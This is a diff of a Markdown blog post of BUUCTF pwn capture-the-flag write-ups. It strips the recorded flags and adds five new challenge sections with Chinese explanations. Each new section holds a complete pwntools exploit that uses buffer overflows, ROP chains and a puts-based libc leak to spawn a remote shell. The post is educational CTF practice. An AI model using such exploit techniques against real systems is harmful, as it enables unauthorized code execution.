@@ -1,7 +1,7 @@
 ---
 title: "Write-ups: BUUCTF"
 published: 2025-07-05
-updated: 2025-07-09
+updated: 2025-07-28
 description: "Write-ups for BUUCTF's pwn aspect."
 image: "https://jsd.cdn.zzko.cn/gh/CuB3y0nd/picx-images-hosting@master/.77dus3996s.avif"
 tags: ["Pwn", "Write-ups"]
@@ -71,10 +71,6 @@ def main():
 if __name__ == "__main__":
     main()
 ```
-
-## Flag
-
-Flag: `flag{840e6d55-5582-4995-a345-79f37e63db00}`
 
 # warmup_csaw_2016
 
@@ -165,10 +161,6 @@ def main():
 if __name__ == "__main__":
     main()
 ```
-
-## Flag
-
-Flag: `flag{25bcbfc0-3b7e-4261-b957-297bf39c1bfd}`
 
 # ciscn_2019_n_1
 
@@ -266,10 +258,6 @@ def main():
 if __name__ == "__main__":
     main()
 ```
-
-## Flag
-
-Flag: `flag{7fd050d8-bfa7-44bc-b98b-a4ee709fea28}`
 
 # pwn1_sctf_2016
 
@@ -420,10 +408,6 @@ if __name__ == "__main__":
     main()
 ```
 
-## Flag
-
-Flag: `flag{db1e1ee0-907b-497b-85eb-9fe936bf26e7}`
-
 # jarvisoj_level0
 
 ## Information
@@ -485,10 +469,6 @@ def main():
 if __name__ == "__main__":
     main()
 ```
-
-## Flag
-
-Flag: `flag{05ce7df6-bb73-4445-9abd-b107d55cede1}`
 
 # [第五空间 2019 决赛] PWN5
 
@@ -604,10 +584,6 @@ if __name__ == "__main__":
     main()
 ```
 
-## Flag
-
-Flag: `flag{a375d1c7-b6dc-4b93-bb5e-9ba59d14060a}`
-
 # jarvisoj_level2
 
 ## Information
@@ -692,10 +668,6 @@ def main():
 if __name__ == "__main__":
     main()
 ```
-
-## Flag
-
-Flag: `flag{b3e65f27-e5ed-4763-a83b-d582ac37b3ea}`
 
 # ciscn_2019_n_8
 
@@ -801,10 +773,6 @@ if __name__ == "__main__":
     main()
 ```
 
-## Flag
-
-Flag: `flag{e913a0b0-686a-4aec-a25e-503e2dc2d226}`
-
 # bjdctf_2020_babystack
 
 ## Information
@@ -892,10 +860,6 @@ def main():
 if __name__ == "__main__":
     main()
 ```
-
-## Flag
-
-Flag: `flag{3e70b773-5928-4c8e-9520-b5c5fc9d2fff}`
 
 # ciscn_2019_c_1
 
@@ -1049,6 +1013,306 @@ if __name__ == "__main__":
     main()
 ```
 
-## Flag
+# jarvisoj_level2_x64
 
-Flag: `flag{02f14642-e0fe-43ec-9eb9-0acbb7691cae}`
+## Information
+
+- Category: Pwn
+- Points: 1
+
+## Write-up
+
+`vulnerable_function` 有一个 BOF，我们用它覆盖 retaddr 构造 ROP Chain，由于会返回到 `system("echo 'Hello World!'")`，我们只要想办法改掉 rdi 即可。这里没有发现获得栈地址的方法，把 `/bin/sh` 写入栈上不行。但是 IDA 搜索字符串发现程序本身包含 `/bin/sh` 字符串，没 PIE，直接拿来用。
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+
+from pwn import ROP, args, context, flat, p64, process, raw_input, remote
+
+FILE = "./level2_x64"
+HOST, PORT = "node5.buuoj.cn", 27792
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+elf = context.binary
+
+
+def launch():
+    if args.L:
+        target = process(FILE)
+    else:
+        target = remote(HOST, PORT)
+    return target
+
+
+def main():
+    target = launch()
+
+    rop = ROP(elf)
+    payload = flat(
+        b"A" * 0x88,
+        p64(rop.rdi.address),
+        0x600A90,
+        p64(rop.ret.address),
+        elf.plt["system"],
+    )
+
+    raw_input()
+    target.sendline(payload)
+    target.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+# get_started_3dsctf_2016
+
+## Information
+
+- Category: Pwn
+- Points: 1
+
+## Write-up
+
+main 中 `gets` BOF，覆盖返回地址为 `get_flag` 即可。但是这个函数会检测传入的两个参数，我们需要把参数设置好。
+
+本地打通了，打远程的时候遇到 `timeout: the monitored command dumped core`，有几种说法是：栈没对齐；程序没正常退出。这里我们给 `get_flag` 设置返回到 `exit` 就行。
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+
+from pwn import args, context, flat, p32, process, raw_input, remote
+
+FILE = "./get_started_3dsctf_2016"
+HOST, PORT = "node5.buuoj.cn", 25782
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+elf = context.binary
+
+
+def launch():
+    if args.L:
+        target = process(FILE)
+    else:
+        target = remote(HOST, PORT)
+    return target
+
+
+def main():
+    target = launch()
+
+    payload = flat(
+        b"A" * 0x38,
+        elf.sym["get_flag"],
+        p32(0x0804E6A0),
+        p32(814536271),
+        p32(425138641),
+    )
+
+    # raw_input()
+    target.sendline(payload)
+    target.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+# [HarekazeCTF2019]baby_rop
+
+## Information
+
+- Category: Pwn
+- Points: 1
+
+## Write-up
+
+和前面 `jarvisoj_level2_x64` 差不多。
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+
+from pwn import ROP, args, context, flat, process, raw_input, remote
+
+FILE = "./babyrop"
+HOST, PORT = "node5.buuoj.cn", 28698
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+elf = context.binary
+
+
+def launch():
+    if args.L:
+        target = process(FILE)
+    else:
+        target = remote(HOST, PORT)
+    return target
+
+
+def main():
+    target = launch()
+
+    rop = ROP(elf)
+    payload = flat(
+        b"A" * 0x18,
+        rop.rdi.address,
+        next(elf.search(b"/bin/sh")),
+        rop.ret.address,
+        elf.plt["system"],
+    )
+
+    # raw_input()
+    target.sendline(payload)
+    target.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+# others_shellcode
+
+## Information
+
+- Category: Pwn
+- Points: 1
+
+## Write-up
+
+怕不是签到题？
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+
+from pwn import args, context, process, remote
+
+FILE = "./shell_asm"
+HOST, PORT = "node5.buuoj.cn", 28960
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+elf = context.binary
+
+
+def launch():
+    if args.L:
+        target = process(FILE)
+    else:
+        target = remote(HOST, PORT)
+    return target
+
+
+def main():
+    target = launch()
+
+    # raw_input()
+    target.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+# [OGeek2019]babyrop
+
+## Information
+
+- Category: Pwn
+- Points: 1
+
+## Write-up
+
+`strlen` 检测到 `\x00` 就结束，所以先通过 `\x00` 绕过 `strncmp`。之后将 `buf[7]` 处的一字节有符号整数转换为无符号数返回，如果这里是 `-1` 就会返回很大的数。
+
+```c ins={13-14}
+int __cdecl sub_804871F(int buffer)
+{
+  size_t len; // eax
+  char s[32]; // [esp+Ch] [ebp-4Ch] BYREF
+  char buf[32]; // [esp+2Ch] [ebp-2Ch] BYREF
+  ssize_t v5; // [esp+4Ch] [ebp-Ch]
+
+  memset(s, 0, sizeof(s));
+  memset(buf, 0, sizeof(buf));
+  sprintf(s, "%ld", buffer);
+  v5 = read(0, buf, 32u);
+  buf[v5 - 1] = 0;
+  len = strlen(buf);
+  if ( strncmp(buf, s, len) )
+    exit(0);
+  write(1, "Correct\n", 8u);
+  return (unsigned __int8)buf[7];
+}
+```
+
+`sub_80487D0` 将上一个函数的返回值作为参数，如果等于 `127` 就执行第一个 `read`，否则执行第二个 `read`。由于我们在 `buf[7]` 处保存 `-1`，会返回 `0xffffffff`，所以我们获得了一个很大的 BOF 空间。
+
+```c del={8}
+ssize_t __cdecl sub_80487D0(char a1)
+{
+  _BYTE buf[231]; // [esp+11h] [ebp-E7h] BYREF
+
+  if ( a1 == 127 )
+    return read(0, buf, 200u);
+  else
+    return read(0, buf, a1);
+}
+```
+
+思路是绕过 `sub_804871F` 的 `strncmp` 后，拿到一个很大的栈溢出，通过 `sub_80487D0` 的 `read(0, buf, a1)` 构造 ROP，利用 `puts` 泄漏 libc，`puts` 返回到 `main` 触发二次输入，同理先绕检测，然后构造 getshell 的 ROP Chain.
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+
+from pwn import ELF, args, context, flat, p32, process, remote, u32
+
+FILE = "./challenge"
+HOST, PORT = "node5.buuoj.cn", 26812
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+elf = context.binary
+libc = ELF("./libc-2.23.so")
+
+
+def launch():
+    if args.L:
+        target = process(FILE)
+    else:
+        target = remote(HOST, PORT)
+    return target
+
+
+def main():
+    target = launch()
+
+    payload_1 = b"\x00" * 0x7 + b"\xff" + b"\x00"
+    target.send(payload_1)
+    target.recvuntil(b"\x0a")
+    payload = flat(b"A" * 0xEB, elf.plt["puts"], p32(elf.sym["main"]), elf.got["puts"])
+    target.send(payload)
+    libc.address = u32(target.recv(0x4)) - libc.sym["puts"]
+
+    target.send(payload_1)
+    target.recvuntil(b"\x0a")
+    payload = flat(b"A" * 0xEB, libc.sym["system"], 0, next(libc.search(b"/bin/sh")))
+    target.send(payload)
+    target.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
